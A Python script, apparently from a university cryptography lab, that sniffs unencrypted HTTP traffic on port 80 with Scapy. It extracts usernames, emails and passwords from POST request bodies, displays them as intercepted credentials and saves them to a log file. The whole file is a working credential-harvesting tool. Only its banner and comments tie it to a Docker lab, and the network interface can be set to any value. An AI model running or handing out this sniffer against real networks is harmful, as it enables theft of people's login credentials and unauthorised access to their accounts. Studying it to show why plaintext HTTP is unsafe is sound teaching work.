#!/usr/bin/env python3
"""
HTTP Interception Script
Intercepta y muestra tráfico HTTP en tiempo real
Extrae credenciales de POST requests
"""

import sys
import re
from datetime import datetime
from scapy.all import sniff, TCP, Raw, conf
from urllib.parse import unquote

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False


class HTTPInterceptor:
    def __init__(self, interface='eth0', log_file='/logs/intercepted_credentials.txt'):
        self.interface = interface
        self.log_file = log_file
        self.packet_count = 0
        self.http_requests = 0
        self.credentials_found = 0
        
    def extract_http_info(self, payload):
        """Extrae información HTTP del payload"""
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
            
            # Detectar método HTTP
            if payload_str.startswith(('GET', 'POST', 'PUT', 'DELETE', 'HEAD')):
                lines = payload_str.split('\r\n')
                method_line = lines[0]
                headers = {}
                body = ''
                
                # Parsear headers
                for i, line in enumerate(lines[1:], 1):
                    if line == '':
                        # Fin de headers, el resto es body
                        body = '\r\n'.join(lines[i+1:])
                        break
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                
                return {
                    'method_line': method_line,
                    'headers': headers,
                    'body': body
                }
        except:
            pass
        
        return None
    
    def extract_credentials(self, body):
        """Extrae credenciales del body de un POST request"""
        credentials = {}
        
        # Patrones comunes de credenciales
        patterns = [
            r'username=([^&\s]+)',
            r'user=([^&\s]+)',
            r'email=([^&\s]+)',
            r'password=([^&\s]+)',
            r'passwd=([^&\s]+)',
            r'pwd=([^&\s]+)',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            if matches:
                key = pattern.split('=')[0].replace('r\'', '')
                credentials[key] = unquote(matches[0])
        
        return credentials if credentials else None
    
    def log_credentials(self, src_ip, dst_ip, credentials, http_info):
        """Guarda credenciales en archivo de log"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        with open(self.log_file, 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Source IP: {src_ip}\n")
            f.write(f"Destination IP: {dst_ip}\n")
            f.write(f"Request: {http_info['method_line']}\n")
            f.write(f"\nCredentials:\n")
            for key, value in credentials.items():
                f.write(f"  {key}: {value}\n")
            f.write(f"{'='*60}\n")
    
    def packet_callback(self, packet):
        """Callback para cada paquete capturado"""
        self.packet_count += 1
        
        if packet.haslayer(TCP) and packet.haslayer(Raw):
            payload = packet[Raw].load
            
            # Extraer información HTTP
            http_info = self.extract_http_info(payload)
            
            if http_info:
                self.http_requests += 1
                
                src_ip = packet['IP'].src
                dst_ip = packet['IP'].dst
                method_line = http_info['method_line']
                
                # Mostrar request
                if RICH_AVAILABLE:
                    console.print(f"\n[cyan]📡 HTTP Request #{self.http_requests}[/cyan]")
                    console.print(f"[blue]{src_ip}[/blue] → [green]{dst_ip}[/green]")
                    console.print(f"[yellow]{method_line}[/yellow]")
                else:
                    print(f"\n📡 HTTP Request #{self.http_requests}")
                    print(f"{src_ip} → {dst_ip}")
                    print(f"{method_line}")
                
                # Si es POST, buscar credenciales
                if method_line.startswith('POST'):
                    body = http_info.get('body', '')
                    credentials = self.extract_credentials(body)
                    
                    if credentials:
                        self.credentials_found += 1
                        
                        if RICH_AVAILABLE:
                            console.print(Panel.fit(
                                f"[bold red]🔓 CREDENCIALES INTERCEPTADAS![/bold red]\n\n" +
                                "\n".join([f"[yellow]{k}:[/yellow] [red]{v}[/red]" for k, v in credentials.items()]),
                                border_style="red"
                            ))
                        else:
                            print("\n" + "="*60)
                            print("🔓 CREDENCIALES INTERCEPTADAS!")
                            for k, v in credentials.items():
                                print(f"  {k}: {v}")
                            print("="*60)
                        
                        # Guardar en log
                        self.log_credentials(src_ip, dst_ip, credentials, http_info)
                        
                        print(f"\n💾 Guardado en: {self.log_file}")
    
    def start_interception(self):
        """Inicia la interceptación"""
        print("\n" + "="*60)
        print("🕵️  HTTP INTERCEPTION TOOL")
        print("Proyecto de Criptografía - UNAL Medellín")
        print("="*60)
        print(f"\nInterfaz: {self.interface}")
        print(f"Log file: {self.log_file}")
        print(f"\n🎯 Interceptando tráfico HTTP...")
        print("⚠️  Presiona Ctrl+C para detener\n")
        print("💡 Capturando tráfico desde:")
        print("   - Contenedores Docker (172.20.0.x)")
        print("   - Host (localhost:8080 → contenedor)")
        print("")
        
        try:
            # Deshabilitar verbose de Scapy
            conf.verb = 0
            
            # Sniff TODO el tráfico TCP puerto 80 (incluyendo desde host)
            sniff(
                iface=self.interface,
                filter="tcp port 80",
                prn=self.packet_callback,
                store=False
            )
            
        except KeyboardInterrupt:
            print("\n\n⚠️  Interceptación detenida")
            print(f"\n📊 Resumen:")
            print(f"   Paquetes procesados: {self.packet_count}")
            print(f"   HTTP requests: {self.http_requests}")
            print(f"   Credenciales encontradas: {self.credentials_found}")
        except Exception as e:
            print(f"\n❌ Error: {e}")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='HTTP Interception Tool')
    parser.add_argument('-i', '--interface', default='eth0', help='Network interface')
    parser.add_argument('-l', '--log', default='/logs/intercepted_credentials.txt', help='Log file')
    
    args = parser.parse_args()
    
    interceptor = HTTPInterceptor(interface=args.interface, log_file=args.log)
    interceptor.start_interception()


if __name__ == '__main__':
    main()
